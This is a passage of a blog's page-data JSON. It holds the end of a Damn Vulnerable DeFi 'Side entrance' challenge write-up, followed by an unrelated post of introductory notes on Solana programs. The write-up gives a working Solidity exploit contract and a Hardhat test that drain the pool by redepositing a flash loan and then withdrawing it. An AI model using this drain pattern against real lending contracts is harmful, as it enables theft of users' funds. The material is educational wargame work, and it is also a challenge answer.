punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/utils/Address.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./SideEntranceLenderPool.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Exploit</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">Address</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">SideEntranceLenderPool</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>deposit<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">exploit</span><span class=\"token punctuation\">(</span>SideEntranceLenderPool target<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">{</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sendValue</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> ethers <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hardhat'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> expect <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'chai'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> Contract <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ethers'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">describe</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[Challenge] Side entrance'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">let</span> deployer<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">const</span> <span class=\"token constant\">ETHER_IN_POOL</span> <span class=\"token operator\">=</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1000'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// const Exploit = contract.fromArtifactName('Exploit');</span>\n\n    <span class=\"token function\">before</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */</span>\n        <span class=\"token punctuation\">[</span>deployer<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getSigners</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> exploit <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Exploit'</span><span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>exploit <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> exploit<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">const</span> SideEntranceLenderPoolFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'SideEntranceLenderPool'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> SideEntranceLenderPoolFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span><span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> value<span class=\"token operator\">:</span> <span class=\"token constant\">ETHER_IN_POOL</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>attackerInitialEthBalance <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span><span class=\"token function\">equal</span><span class=\"token punctuation\">(</span><span class=\"token constant\">ETHER_IN_POOL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">it</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Exploit'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">/** CODE YOUR EXPLOIT HERE */</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>exploit<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exploit</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">after</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">/** SUCCESS CONDITIONS */</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">equal</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token comment\">// Not checking exactly how much is the final balance of the attacker,</span>\n        <span class=\"token comment\">// because it'll depend on how much gas the attacker spends in the attack</span>\n        <span class=\"token comment\">// If there were no gas costs, it would be balance before attack + ETHER_IN_POOL</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">gt</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>attackerInitialEthBalance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div>\n<h2 id=\"next-time-\" style=\"position:relative;\"><a href=\"#next-time-\" aria-label=\"next time  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>next time.. üöÄ</h2>\n<p>I will continue to post auditing and research on 12 challenge defi Smart Contracts.</p>\n<p>Thank you for the @tinchoabbate that made a good wargame.\n<a href=\"https://www.damnvulnerabledefi.xyz/\">Damn Vunlerable Defi</a></p>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#code-audit\">Code Audit</a></p>\n<ul>\n<li><a href=\"#dependency\">Dependency</a></li>\n<li><a href=\"#state-variable\">State Variable</a></li>\n<li><a href=\"#functions\">Functions</a></li>\n<li><a href=\"#the-big-differences-are\">The big differences are:</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#vulnerability\">vulnerability</a></p>\n</li>\n<li>\n<p><a href=\"#solve\">Solve</a></p>\n</li>\n<li>\n<p><a href=\"#next-time-\">next time.. üöÄ</a></p>\n</li>\n</ul>\n</div>","frontmatter":{"date":"July 30, 2022","title":"Damn Vulnerable DeFi Wargame Challenge4 ‚Äî Side entrance Contract Analysisü§î","categories":"Blockchain","author":"Zer0Luck","emoji":"ü¶ä"},"fields":{"slug":"/defi-wargame-4/"}},"prev":{"id":"ce6a638f-fc43-5b44-8fcf-29693cc5223f","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACh0lEQVQoz2WR3UuTcRTHz7Pn2UvMbc69OB+1kTnNNR1WtlZmNRMzMcllmk2XMxZlUVK6sldCeoOIUAShF8sICYLoMrDLrqKLbgv6N7r7xPNMLeji/M45v9/5fTjfc0TRyhHR0APN7PcN0+4fJKH30V6eoSuUpTOUocl7EK9tI5WuOI2xXipCMco31FO5o5Vw8gCauBDFjqIFEYs1hIiD2tYeTo0vM5F4z1T8A/mGl2Rr55lu+MhEdJFqbwvJLaP0bX1AdNMhEp4MHmcEa0kFonhQVC+iBhGzQ0sA1VlFPD9Oz4150oXnDFxYZKR3ice7f3Et9omWyDA3b3zj/p2f7Kod4Xj1IxQtgCg+DIaiBk0Tg2pClQAibsQaQDx+ssfeMJleIRtdZCr+hYG6p6QLCzz58ZujyRk6gpcR1YNFqyj+N6AmxzgMqDWExaGj2nVzBF25e0y//k6ue4nrO78SLknh0mNkP68wMLaA19KIWH1oNh1zbGuN/Q3KEHGhiB9R/Ijmp+VCgT2pSexSi4gTER+iBJENlYiUFOuMhYiXtcZkDeaq2oF/6CS2VBKrXWfb9nYCvgj10QR10QQl7hrszmpiTW1sDDejVzfhKq2hMb6PqnDchBclm1t2E6kbovXuW9zDgwQD9czNv6AwPcPZ8QK3bj9kcChPLN7G4qtlZuee8fDRrHlv5FNX767LFosWQhQ3dd4jnNj7jkhqHLurivyZK4ycOk9m5Bzp/hy505foOzZKcs9henozdHT2Mzp2kQPtR9nd2o3Vof8jWQ1is4Vx2DejqsZDYHU+nlVfVrT1mXkQKV317mL831IMiGoso5gbZshY8xZr8U61VazmRVNtofU6o8M/13ROJi18q2AAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"sol.png\"\n        title=\"sol.png\"\n        src=\"/static/42c50aa129dde452dfcc4a7375ec7765/37523/sol.png\"\n        srcset=\"/static/42c50aa129dde452dfcc4a7375ec7765/e9ff0/sol.png 180w,\n/static/42c50aa129dde452dfcc4a7375ec7765/f21e7/sol.png 360w,\n/static/42c50aa129dde452dfcc4a7375ec7765/37523/sol.png 720w,\n/static/42c50aa129dde452dfcc4a7375ec7765/302a4/sol.png 1080w,\n/static/42c50aa129dde452dfcc4a7375ec7765/07a9c/sol.png 1440w,\n/static/42c50aa129dde452dfcc4a7375ec7765/29114/sol.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"programs\" style=\"position:relative;\"><a href=\"#programs\" aria-label=\"programs permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Programs</h2>\n<ul>\n<li>Developers can write and deploy programs on the Solana blockchain.</li>\n<li>Program (referred to as Smart Contract in Ethereum Protocol)</li>\n<li>The basic role of on-chain Horadong that supports everything such as Defi, NFT, Social Media, etc.</li>\n<li>The program handles the commands of the end user and other programs</li>\n<li>All programs are stateless, all data they interact with is stored in a separate account passed through commands</li>\n<li>The program itself is stored in an account marked as executable</li>\n<li>All programs are owned by BPF Loader and executed in Solana Runtime</li>\n<li>Developers most commonly write Rust and C++ programs, but you can choose any language that targets BPF or LLVM in the backend.</li>\n<li>Every program has a single entry point where instruction processing takes place. (i.e. Process_instruction)</li>\n<li>program_id: pubkey</li>\n<li>accounts: array,</li>\n<li>instruction_data: byte array</li>\n</ul>\n<h2 id=\"unlike-other-blockchains-solana-completely-separates-code-and-data\" style=\"position:relative;\"><a href=\"#unlike-other-blockchains-solana-completely-separates-code-and-data\" aria-label=\"unlike other blockchains solana completely separates code and data permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Unlike other blockchains, Solana completely separates code and data.</h2>\n<ul>\n<li>All data with which the program interacts is stored in a separate account and -passed by reference through instructions.</li>\n<li>This model allows a single generic program to operate on multiple accounts without further deployment.</li>\n<li>Common examples of this pattern can be found in native and SPL programs.</li>\n</ul>\n<h2 id=\"native-program-solana-program-lib\" style=\"position:relative;\"><a href=\"#native-program-solana-program-lib\" aria-label=\"native program solana program lib permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Native Program, Solana Program Lib</h2>\n<ul>\n<li>It has several programs that serve as key building blocks for on-chain interactions.</li>\n<li>The Natebee program provides the basic functions necessary to operate the validator.</li>\n<li>The most well-known of these programs is the system program.</li>\n<li>Responsible for managing new accounts and transferring SOLs between the two parties.</li>\n<li>The SPL program supports a variety of on-chain activities including token creation, exchange and lending, creating stake pools and maintaining on-chain name services.</li>\n<li>Can be called directly through the SPL token program, while others like the Associated Token Account Program are usually configured as user-defined programs.</li>\n</ul>\n<h2 id=\"write-program\" style=\"position:relative;\"><a href=\"#write-program\" aria-label=\"write program permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Write Program</h2>\n<ul>\n<li>Programs are most commonly developed in Rust and C++, but can be developed in any language targeting LLVM and BPF backends.</li>\n<li>It provides EVM activation compatibility such as Solidity and enables developers to write programs in Solidity.</li>\n</ul>\n<h2 id=\"rust-based-program-architecture\" style=\"position:relative;\"><a href=\"#rust-based-program-architecture\" aria-label=\"rust based program architecture permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Rust-based program architecture</h2>\n<table>\n<thead>\n<tr>\n<th>File</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><a href=\"http://lib.rs\">lib.rs</a></td>\n<td>Registering Modules</td>\n</tr>\n<tr>\n<td><a href=\"http://entrypoint.rs\">entrypoint.rs</a></td>\n<td>EntryPoint to the Program</td>\n</tr>\n<tr>\n<td><a href=\"http://instruction.rs\">instruction.rs</a></td>\n<td>Program API, (de)serializing instruction data</td>\n</tr>\n<tr>\n<td><a href=\"http://state.rs\">state.rs</a></td>\n<td>Program Objects, (de)serializing</td>\n</tr>\n<tr>\n<td><a href=\"http://erro.rs\">erro.rs</a></td>\n<td>Program-specific erros</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>Recently, Anchor (similar to Ruby on Rails) is a unique framework that reduces usage and simplifies the (deserialization) process for Rust-based development.</li>\n<li>Programs are generally developed and tested on Localhost and Devnet environments before being distributed to Testnet or Mainnet.</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>Cluster Env</th>\n<th>RPC Connection URL</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Mainnet-Beta</td>\n<td><a href=\"https://api.mainnet-beta.solana.com\">https://api.mainnet-beta.solana.com</a></td>\n</tr>\n<tr>\n<td>Testnet</td>\n<td><a href=\"https://api.testnet.solana.com\">https://api.testnet.solana.com</a></td>\n</tr>\n<tr>\n<td>Devnet</td>\n<td><a href=\"https://api.devnet.solana.com\">https://api.devnet.solana.com</a></td>\n</tr>\n<tr>\n<td>Localhost</td>\n<td>default port: 8899</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"program-deploy\" style=\"position:relative;\"><a href=\"#program-deploy\" aria-label=\"program deploy permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Program Deploy</h2>\n<ul>\n<li>Programs can be deployed through CLI.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\">    solana program deploy <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">PROGRAM_FILEPATH</span></span><span class=\"token punctuation\">></span></span></code></pre></div>\n<ul>\n<li>When the program is distributed, it is compiled into an ELF Sharing Object.</li>\n<li>BPF Byte Code, upload to Solana Cluster</li>\n<li>An Executable program exists in the account (very similar to everything else in Solana), except that this account is marked and assigned as a BPF Loader.</li>\n<li><code class=\"language-text\">program_id</code> is the address of your account, which will be used to refer to the program in all future transactions</li>\n<li>Supports Upgradable BPF Loader, manages program account (program_id)</li>\n<li>When called, the program is executed by Solana Runtime.</li>\n</ul>\n<h2 id=\"other-resources\" style=\"position:relative;\"><a href=\"#other-resources\" aria-label=\"other resources permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Other Resources</h2>\n<ul>\n<li><a href=\"https://docs.solana.com/developing/on-chain-programs/overview\">Solana on-chain-programs</a></li>\n<li><a href=\"https://jstarry.notion.site/Program-deploys-29780c48794c47308d5f138074dd9838\">Program-deploys</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#programs\">Programs</a></li>\n<li><a href=\"#unlike-other-blockchains-solana-completely-separates-code-and-data\">Unlike other blockchains, Solana completely separates code and data.</a></li>\n<li><a href=\"#native-program-solana-program-lib\">Native Program, Solana Program Lib</a></li>\n<li><a href=\"#write-program\">Write Program</a></li>\n<li><a href=\"#rust-based-program-architecture\">Rust-based program architecture</a></li>\n<li><a href=\"#program-deploy\">Program Deploy</a></li>\n<li><a href=\"#other-resources\">Other Resources</a></li>\n</ul>\n</div>","frontmatter":{"date":"July 31, 2022","title":"Solana Chain analysis Programs","categories":"Solana","author":"Zer0Luck","emoji":"üåû"},"fields":{"slug":"/solana-chain-programs/"}},"site":{"siteMetadata":{"siteUrl":"https://zer0luck.kr","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/solana-chain-Program-Derived-Address/","nextSlug":"/defi-wargame-4/","prevSlug":"/solana-chain-programs/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}